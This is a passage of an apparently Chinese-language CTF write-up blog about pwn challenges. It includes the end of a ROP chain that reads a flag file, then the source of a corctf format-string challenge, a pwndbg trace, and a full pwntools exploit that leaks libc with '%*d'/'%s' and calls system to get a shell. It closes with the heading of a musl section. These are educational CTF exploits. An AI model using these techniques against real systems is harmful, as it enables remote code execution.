sa<span class="token punctuation">(</span><span class="token string">"Please tell us something: "</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>

<span class="token builtin">open</span><span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"open"</span><span class="token punctuation">]</span>
read<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span>
write<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>
pop_rdi<span class="token operator">=</span>pie<span class="token operator">+</span><span class="token number">0x1573</span>
pop_rsi<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x2601f</span>
pop_rdx<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x15fae6</span>
flag<span class="token operator">=</span>bss<span class="token operator">+</span><span class="token number">0xe0</span>
buf<span class="token operator">=</span>bss<span class="token operator">+</span><span class="token number">0x100</span>

payload<span class="token operator">=</span><span class="token string">b"HZNUCTF\x00"</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">0x48</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x110</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>read<span class="token punctuation">)</span>
sa<span class="token punctuation">(</span><span class="token string">"Please tell us something: "</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>

payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read<span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>write<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b"./flag\x00"</span>
s<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="3个字节格式化字符串泄露libc"><a href="#3个字节格式化字符串泄露libc" class="headerlink" title="3个字节格式化字符串泄露libc"></a>3个字节格式化字符串泄露libc</h2><p>corctf_format-string</p>
<p>source.c</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>

<span class="token keyword">void</span> <span class="token function">do_printf</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%3s"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Here: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">do_call</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>ptr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%p"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>ptr<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">ptr</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> choice<span class="token punctuation">;</span>

    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"1. printf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"2. call"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>choice<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>

        <span class="token keyword">switch</span> <span class="token punctuation">(</span>choice<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>
                <span class="token function">do_printf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>
                <span class="token function">do_call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">default</span><span class="token operator">:</span>
                <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid choice!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>程序的输入只有三个字节，只需要泄露libc的地址就可以通过do_call去getshell，”%*d”表达式有两个参数一个是打印的宽度，另一个是打印的字符，printf(“% *d”, 5, 42); 这里rsi是宽度 rdx是打印的数字</p>
<p>在第一次do_printf的时候 printf(“Here: “); rsi残留了一个printf缓冲区的地址，这个地址被当成了宽度，在解析格式化字符串的时候printf的缓冲区被写满了字符，第二个do_printf的时候，通过 %s可以将printf缓冲区的内容泄露出来，缓冲区结尾有libc的地址，所以可以通过这种方式去泄露libc</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; 
0x00005d8dccc20236 in do_printf ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────[ REGISTERS &#x2F; show-flags off &#x2F; show-compact-regs off ]───────────────────────────────────────
*RAX  0x0
 RBX  0x5d8dccc203b0 (__libc_csu_init) ◂— endbr64 
 RCX  0x0
 RDX  0x0
 RDI  0x5d8dccc21008 ◂— 0x2500203a65726548 &#x2F;* &#39;Here: &#39; *&#x2F;
 RSI  0x4
 R8   0x64
 R9   0x0
 R10  0x5d8dccc21004 ◂— 0x6572654800733325 &#x2F;* &#39;%3s&#39; *&#x2F;
 R11  0x246
 R12  0x5d8dccc20100 (_start) ◂— endbr64 
 R13  0x7ffe4c726f90 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7ffe4c726e80 —▸ 0x7ffe4c726ea0 ◂— 0x0
 RSP  0x7ffe4c726e70 ◂— 0x642a25ccc20100
*RIP  0x5d8dccc20236 (do_printf+77) ◂— call 0x5d8dccc200c0
────────────────────────────────────────────────[ DISASM &#x2F; x86-64 &#x2F; set emulate on ]────────────────────────────────────────────────
   0x5d8dccc20217 &lt;do_printf+46&gt;    call   __isoc99_scanf@plt                &lt;__isoc99_scanf@plt&gt;
 
   0x5d8dccc2021c &lt;do_printf+51&gt;    test   eax, eax
   0x5d8dccc2021e &lt;do_printf+53&gt;    jg     do_printf+65                &lt;do_printf+65&gt;
    ↓
   0x5d8dccc2022a &lt;do_printf+65&gt;    lea    rdi, [rip + 0xdd7]
   0x5d8dccc20231 &lt;do_printf+72&gt;    mov    eax, 0
 ► 0x5d8dccc20236 &lt;do_printf+77&gt;    call   printf@plt                &lt;printf@plt&gt;
        format: 0x5d8dccc21008 ◂— 0x2500203a65726548 &#x2F;* &#39;Here: &#39; *&#x2F;
        vararg: 0x4
 
   0x5d8dccc2023b &lt;do_printf+82&gt;    lea    rax, [rbp - 0xc]
   0x5d8dccc2023f &lt;do_printf+86&gt;    mov    rdi, rax
   0x5d8dccc20242 &lt;do_printf+89&gt;    mov    eax, 0
   0x5d8dccc20247 &lt;do_printf+94&gt;    call   printf@plt                &lt;printf@plt&gt;
 
   0x5d8dccc2024c &lt;do_printf+99&gt;    nop    
─────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffe4c726e70 ◂— 0x642a25ccc20100
01:0008│     0x7ffe4c726e78 ◂— 0xace6cc258ec17700
02:0010│ rbp 0x7ffe4c726e80 —▸ 0x7ffe4c726ea0 ◂— 0x0
03:0018│     0x7ffe4c726e88 —▸ 0x5d8dccc2036c (main+164) ◂— jmp 0x5d8dccc20390
04:0020│     0x7ffe4c726e90 ◂— 0x14c726f90
05:0028│     0x7ffe4c726e98 ◂— 0xace6cc258ec17700
06:0030│     0x7ffe4c726ea0 ◂— 0x0
07:0038│     0x7ffe4c726ea8 —▸ 0x7d2bbe226083 (__libc_start_main+243) ◂— mov edi, eax
───────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────
 ► 0   0x5d8dccc20236 do_printf+77
   1   0x5d8dccc2036c main+164
   2   0x7d2bbe226083 __libc_start_main+243
   3   0x5d8dccc2012e _start+46
───────────────────────────<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>exp</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># from LibcSearcher import *</span>
<span class="token keyword">import</span> itertools
<span class="token keyword">import</span> ctypes

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>
<span class="token comment"># log_level='debug'</span>

is_debug <span class="token operator">=</span> <span class="token number">0</span>
IP <span class="token operator">=</span> <span class="token string">"be.ax"</span>
PORT <span class="token operator">=</span> <span class="token number">32323</span>

elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./chal'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>

g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
r_leak_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leak_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">create_ucontext</span><span class="token punctuation">(</span>
    src<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span>
    rsp<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rbx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rbp<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r12<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r13<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r14<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r15<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rsi<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rdi<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rcx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r8<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r9<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rdx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rip<span class="token operator">=</span><span class="token number">0xDEADBEEF</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytearray</span><span class="token punctuation">:</span>
    b <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0xE0</span><span class="token punctuation">:</span><span class="token number">0xE8</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>src<span class="token punctuation">)</span>  <span class="token comment"># fldenv ptr</span>
    b<span class="token punctuation">[</span><span class="token number">0x1C0</span><span class="token punctuation">:</span><span class="token number">0x1C8</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x1F80</span><span class="token punctuation">)</span>  <span class="token comment"># ldmxcsr</span>

    b<span class="token punctuation">[</span><span class="token number">0xA0</span><span class="token punctuation">:</span><span class="token number">0xA8</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rsp<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x80</span><span class="token punctuation">:</span><span class="token number">0x88</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rbx<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x78</span><span class="token punctuation">:</span><span class="token number">0x80</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rbp<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x48</span><span class="token punctuation">:</span><span class="token number">0x50</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r12<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x50</span><span class="token punctuation">:</span><span class="token number">0x58</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r13<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x58</span><span class="token punctuation">:</span><span class="token number">0x60</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r14<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x60</span><span class="token punctuation">:</span><span class="token number">0x68</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r15<span class="token punctuation">)</span>

    b<span class="token punctuation">[</span><span class="token number">0xA8</span><span class="token punctuation">:</span><span class="token number">0xB0</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rip<span class="token punctuation">)</span>  <span class="token comment"># ret ptr</span>
    b<span class="token punctuation">[</span><span class="token number">0x70</span><span class="token punctuation">:</span><span class="token number">0x78</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x68</span><span class="token punctuation">:</span><span class="token number">0x70</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x98</span><span class="token punctuation">:</span><span class="token number">0xA0</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rcx<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x28</span><span class="token punctuation">:</span><span class="token number">0x30</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r8<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x30</span><span class="token punctuation">:</span><span class="token number">0x38</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r9<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x88</span><span class="token punctuation">:</span><span class="token number">0x90</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rdx<span class="token punctuation">)</span>

    <span class="token keyword">return</span> b


<span class="token keyword">def</span> <span class="token function">setcontext32</span><span class="token punctuation">(</span>libc<span class="token punctuation">:</span> ELF<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    got <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> libc<span class="token punctuation">.</span>dynamic_value_by_tag<span class="token punctuation">(</span><span class="token string">"DT_PLTGOT"</span><span class="token punctuation">)</span>
    plt_trampoline <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> libc<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">".plt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
    <span class="token keyword">return</span> got<span class="token punctuation">,</span> flat<span class="token punctuation">(</span>
        p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        p64<span class="token punctuation">(</span>got <span class="token operator">+</span> <span class="token number">0x218</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"setcontext"</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        p64<span class="token punctuation">(</span>plt_trampoline<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0x40</span><span class="token punctuation">,</span>
        create_ucontext<span class="token punctuation">(</span>got <span class="token operator">+</span> <span class="token number">0x218</span><span class="token punctuation">,</span> rsp<span class="token operator">=</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"environ"</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">)</span>
<span class="token comment"># e.g. dest, payload = setcontext32.setcontext32(</span>
<span class="token comment">#         libc, rip=libc.sym["system"], rdi=libc.search(b"/bin/sh").__next__()</span>
<span class="token comment">#     )</span>


p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">print_data</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sl<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>data<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">call_addr</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sl<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

print_data<span class="token punctuation">(</span><span class="token string">"%*d"</span><span class="token punctuation">)</span>
print_data<span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">)</span>

system <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x19a6f0</span>
call_addr<span class="token punctuation">(</span>system<span class="token punctuation">)</span>



p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="musl-libc中的格式化字符串-和禁用-差不多"><a href="#musl-libc中的格式化字符串-和禁用-差不多" class="headerlink" title="musl libc中的格式化字符串 (和禁用$差不多)"></a>musl libc中的格式化字符串 (和禁用$差不多)</h2><p>crewctf_Format muscle</p>
<p>使用musl libc动态连接</p>
